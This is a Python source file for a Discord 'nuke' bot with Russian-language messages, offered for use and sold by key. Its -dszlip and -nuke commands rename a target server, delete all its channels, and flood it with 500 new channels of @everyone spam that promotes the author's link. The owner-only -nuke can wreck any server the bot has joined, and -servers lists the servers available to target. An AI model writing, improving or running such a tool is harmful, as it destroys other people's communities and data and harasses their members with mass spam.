import discord
from discord.ext import commands
import asyncio
import time
import os
import json
from datetime import datetime

bot = commands.Bot(command_prefix='-', intents=discord.Intents.all(), help_command=None)

OWNER_ID = 1448196738308509739
keys_db = "keys.json"

def load_keys():
    try:
        with open(keys_db, "r") as f:
            return json.load(f)
    except:
        return {}

def save_keys(keys):
    with open(keys_db, "w") as f:
        json.dump(keys, f)

keys_data = load_keys()

def is_owner(ctx):
    return ctx.author.id == OWNER_ID

def has_key(user_id):
    return str(user_id) in keys_data

# ── СОБЫТИЯ ──
@bot.event
async def on_ready():
    print(f'✅ {bot.user} готов')
    await bot.change_presence(activity=discord.Game(name="-dszlip"))

# ── КОМАНДЫ ──
@bot.command()
async def dszlip(ctx):
    if not has_key(ctx.author.id) and not is_owner(ctx):
        embed = discord.Embed(
            title="ДОСТУП ЗАПРЕЩЁН",
            description="У вас нет активного ключа.\nИспользуйте `-key` для активации.",
            color=0x2f3136
        )
        await ctx.send(embed=embed)
        return

    if not ctx.author.guild_permissions.administrator:
        await ctx.send("❌ Нужны права администратора!")
        return

    await ctx.send("**НАЧАЛО НЮКА**")
    
    guild = ctx.guild
    start_time = time.time()
    
    # Меняем название
    await guild.edit(name="MOGGED BY ZLIP")
    
    # Удаляем каналы
    for channel in guild.channels:
        try:
            await channel.delete()
        except:
            pass
    
    # Создаём 500 каналов со спамом
    SPAM = """@everyone
MOGGED BY ZLIP
https://guns.lol/dszlip
ВЫ УПАЛИ НА КОЛЕНИ"""
    
    for i in range(500):
        try:
            ch = await guild.create_text_channel(f"zlip-{i+1}")
            for _ in range(5):
                await ch.send(SPAM)
            await asyncio.sleep(0.05)
        except:
            break
    
    elapsed = round(time.time() - start_time, 1)
    embed = discord.Embed(
        title="СЕРВЕР УНИЧТОЖЕН",
        description=f"Каналов: 500\nСообщений: 2500\nВремя: {elapsed}с",
        color=0x2f3136
    )
    await ctx.send(embed=embed)

@bot.command()
async def key(ctx):
    embed = discord.Embed(
        title="АКТИВАЦИЯ КЛЮЧА",
        description="Введите ключ командой:\n`-activate КЛЮЧ`",
        color=0x2f3136
    )
    embed.set_footer(text="Приобрести ключ: @dszlip")
    await ctx.send(embed=embed)

@bot.command()
async def activate(ctx, *, key: str = None):
    if not key:
        await ctx.send("❌ Использование: `-activate КЛЮЧ`")
        return
    
    if key in keys_data.values():
        await ctx.send("❌ Этот ключ уже использован")
        return
    
    # Проверяем ключ (можно добавить свою генерацию)
    if len(key) >= 8:
        keys_data[str(ctx.author.id)] = key
        save_keys(keys_data)
        
        embed = discord.Embed(
            title="КЛЮЧ АКТИВИРОВАН",
            description="Доступ к боту получен!\nИспользуйте `-dszlip` для нюка.",
            color=0x2f3136
        )
        await ctx.send(embed=embed)
    else:
        await ctx.send("❌ Неверный ключ")

@bot.command()
async def nuke(ctx, guild_id: int = None):
    if not is_owner(ctx):
        return
    
    if not guild_id:
        await ctx.send("❌ Использование: `-nuke ID_СЕРВЕРА`")
        return
    
    guild = bot.get_guild(guild_id)
    if not guild:
        await ctx.send(f"❌ Сервер с ID `{guild_id}` не найден")
        return
    
    await ctx.send(f"🔥 НЮК СЕРВЕРА: **{guild.name}**")
    
    await guild.edit(name="MOGGED BY ZLIP")
    for channel in guild.channels:
        try:
            await channel.delete()
        except:
            pass
    
    SPAM = """@everyone
MOGGED BY ZLIP
https://guns.lol/dszlip"""
    
    for i in range(500):
        try:
            ch = await guild.create_text_channel(f"zlip-{i+1}")
            for _ in range(5):
                await ch.send(SPAM)
        except:
            break
    
    await ctx.send(f"✅ Сервер **{guild.name}** уничтожен")

@bot.command()
async def servers(ctx):
    if not is_owner(ctx):
        return
    
    desc = ""
    for g in bot.guilds:
        desc += f"**{g.name}**\nID: `{g.id}`\nУчастников: {g.member_count}\n\n"
    
    embed = discord.Embed(
        title="СПИСОК СЕРВЕРОВ",
        description=desc or "Нет серверов",
        color=0x2f3136
    )
    await ctx.send(embed=embed)

@bot.command()
async def genkey(ctx, user: discord.User = None):
    if not is_owner(ctx):
        return
    
    if not user:
        await ctx.send("❌ Использование: `-genkey @пользователь`")
        return
    
    key = f"ZLIP-{int(time.time())}-{user.id}"[:16]
    keys_data[str(user.id)] = key
    save_keys(keys_data)
    
    embed = discord.Embed(
        title="КЛЮЧ ВЫДАН",
        description=f"Пользователь: {user.mention}\nКлюч: `{key}`",
        color=0x2f3136
    )
    await ctx.send(embed=embed)
    
    try:
        await user.send(f"🔑 Ваш ключ: `{key}`\nИспользуйте `-activate {key}` для активации")
    except:
        pass

@bot.command()
async def delkey(ctx, user: discord.User = None):
    if not is_owner(ctx):
        return
    
    if not user:
        await ctx.send("❌ Использование: `-delkey @пользователь`")
        return
    
    if str(user.id) in keys_data:
        del keys_data[str(user.id)]
        save_keys(keys_data)
        await ctx.send(f"✅ Ключ у {user.mention} удалён")
    else:
        await ctx.send(f"❌ У {user.mention} нет ключа")

@bot.command()
async def keys(ctx):
    if not is_owner(ctx):
        return
    
    desc = ""
    for uid, key in keys_data.items():
        try:
            user = await bot.fetch_user(int(uid))
            desc += f"{user.name}: `{key}`\n"
        except:
            desc += f"`{uid}`: `{key}`\n"
    
    embed = discord.Embed(
        title="АКТИВНЫЕ КЛЮЧИ",
        description=desc or "Нет ключей",
        color=0x2f3136
    )
    await ctx.send(embed=embed)

import os
bot.run(os.environ['TOKEN'])
